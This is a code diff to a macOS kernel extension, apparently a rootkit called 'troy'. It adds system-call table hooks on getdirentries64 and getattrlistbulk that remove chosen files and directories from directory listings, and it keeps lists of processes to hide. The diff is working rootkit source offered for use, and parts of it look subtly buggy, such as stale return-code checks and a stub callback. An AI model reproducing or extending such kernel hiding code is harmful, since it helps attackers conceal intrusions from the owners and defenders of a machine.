@@ -29,7 +29,9 @@ extern struct hide_proc_list hide_proc_array;  //for store process that is hide
 extern struct hide_file_dirent_list hide_file_dirent_array;
 #pragma origianl function
 extern getdirentries64_function_prototype my_getdirentries64;
-extern getdirentriesattr_function_prototype my_getdirentriseattr;
+//extern getdirentriesattr_function_prototype my_getdirentriseattr;
+extern getattrlist_function_prototype my_getattrlist;
+extern getattrlistbulk_function_prototype my_getattrlistbulk;
 
 int hide_given_directory(troy_hide_object *directory_hide)
 {
@@ -43,21 +45,58 @@ int hide_given_directory(troy_hide_object *directory_hide)
     lck_mtx_lock(lck_mtx_hide_directory);
 
     //hook getdirentries64
+    //-------------begin----------------
     mach_vm_address_t getdirentries_entry_addr=0;
-    GetOriginalFunction(SYS_getdirentries64, &getdirentries_entry_addr);
-    my_getdirentries64=*((getdirentries64_function_prototype)(getdirentries_entry_addr));
-    LOG(LOG_DEBUG, "original_getdirentries_ptr address is %p, %p, %llx", *my_getdirentries64,&my_getdirentries64, getdirentries_entry_addr);
+    int return_code=0;
 
-    int return_code = SetSystemCallHandle(my_getdirentries64_callback, SYS_getdirentries64);
+    return_code = GetOriginalFunction(SYS_getdirentries64, &getdirentries_entry_addr);
+    if(return_code!=TROY_SUCCESS)
+    {
+        LOG(LOG_ERROR, "Get SYS_getdirentries64 original function failed");
+        return return_code;
+    }
+
+    my_getdirentries64=*((getdirentries64_function_prototype)(getdirentries_entry_addr));
+    LOG(LOG_DEBUG, "original_getdirentries_ptr address is %p", *my_getdirentries64);
+
+    return_code = SetSystemCallHandle(my_getdirentries64_callback, SYS_getdirentries64);
     if(return_code!=TROY_SUCCESS)
     {
         lck_mtx_unlock(lck_mtx_hide_directory);
         return return_code;
     }
+    //-------------end----------------
+
+    //hook getattrlistbulk(only support yousemite)
+    //-------------begin----------------
+    mach_vm_address_t getattrlistbulk_entry_addr=0;
+    GetOriginalFunction(SYS_getattrlistbulk, &getattrlistbulk_entry_addr);    //get original function
+    if(return_code!=TROY_SUCCESS)
+    {
+        LOG(LOG_ERROR, "Get SYS_getattrlistbulk original function failed");
+        return return_code;
+    }
+
+    my_getattrlistbulk = *((getattrlistbulk_function_prototype)(getattrlistbulk_entry_addr));
+    LOG(LOG_DEBUG, "original_my_getattrlist_ptr is %p", *my_getattrlist);
+
+    return_code = SetSystemCallHandle(my_getattrlistbulk_callback, SYS_getattrlistbulk);
+    if(return_code!=TROY_SUCCESS)
+    {
+        lck_mtx_unlock(lck_mtx_hide_directory);
+        return return_code;
+    }
+    //-------------end----------------
 
     //hook getdirentriesattr
-    mach_vm_address_t getdirentriesattr_entry_addr=0;
+    /*mach_vm_address_t getdirentriesattr_entry_addr=0;
     GetOriginalFunction(SYS_getdirentriesattr, &getdirentriesattr_entry_addr);    //get original function
+    if(return_code!=TROY_SUCCESS)
+    {
+        LOG(LOG_ERROR, "Get SYS_getdirentriesattr original function failed");
+        return return_code;
+    }
+
     my_getdirentriseattr = *((getdirentriesattr_function_prototype)(getdirentriesattr_entry_addr));
     LOG(LOG_DEBUG, "original_getdirentriesattr_ptr is %p", my_getdirentriseattr);
 
@@ -66,7 +105,7 @@ int hide_given_directory(troy_hide_object *directory_hide)
     {
         lck_mtx_unlock(lck_mtx_hide_directory);
         return return_code;
-    }
+    }*/
 
     //add hide object here
     struct hide_file_dirent *file_dirent_obj=(struct hide_file_dirent*)_MALLOC(sizeof(struct hide_file_dirent), M_TEMP, M_WAITOK);
@@ -153,6 +192,7 @@ int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap
     user_ssize_t buf_size, real_size, total_size;
     void *mem;
     struct direntry *direntry_ptr=NULL;
+    int is_found=0;
     LOG(LOG_ERROR, "in ");
     int return_code = (*my_getdirentries64)(p, uap, retval);
     if(return_code!=0)
@@ -191,10 +231,12 @@ int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap
             LOG(LOG_DEBUG, "hide file is %s", var->name);
             if(strcmp(direntry_ptr->d_name, var->name)==0)
             {
-                real_size-=direntry_ptr->d_reclen;  //real_size
+                //real_size-=direntry_ptr->d_reclen;  //real_size
                 buf_size-=direntry_ptr->d_reclen;   //for reading next buf
-                bcopy((char*)direntry_ptr+direntry_ptr->d_reclen, (char*)direntry_ptr, total_size-((char *)mem-(char*)direntry_ptr));//cover hidden one
+                LOG(LOG_ERROR, "total_size is %llu", total_size-((char *)mem-(char*)direntry_ptr));
+                bcopy(((char*)direntry_ptr)+direntry_ptr->d_reclen, (char*)direntry_ptr, total_size-((char *)mem-(char*)direntry_ptr));//cover hidden one
                 found=1;
+                is_found=1;
                 break;
             }
         }
@@ -204,9 +246,13 @@ int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap
         direntry_ptr=(struct direntry*)((char*)direntry_ptr+direntry_ptr->d_reclen);    //read dirent's struct
     }
 
-    copyout(mem, CAST_USER_ADDR_T(uap->bufp), real_size);
-    *retval=real_size;
+    if(is_found)
+    {
+        copyout(mem, CAST_USER_ADDR_T(uap->bufp), real_size);
+        *retval=real_size;
+    }
     LOG(LOG_ERROR, "the real size is %llu", real_size);
+    SAFE_FREE(mem);
 
     //LOG(LOG_DEBUG, "buf_size=%llu", buf_size);
 
@@ -220,9 +266,16 @@ int my_getdirentries64_callback(struct proc *p, struct getdirentries64_args *uap
     return 0;
 }
 
-int my_getdirentriesattr_callback(struct proc *p,struct getdirentriesattr_args *uap, int32_t *retval)
+int my_getattrlistbulk_callback(struct proc * p,struct getattrlistbulk_args *uap,int32_t *retval)
 {
     LOG(LOG_DEBUG, "I am in");
+
+    int return_code = (*my_getattrlistbulk)(p, uap, retval);
+    if(return_code!=0)
+    {
+        LOG(LOG_ERROR, "getattrlist failed, return code is %d", return_code);
+        return return_code;
+    }
 
     return 0;
 }
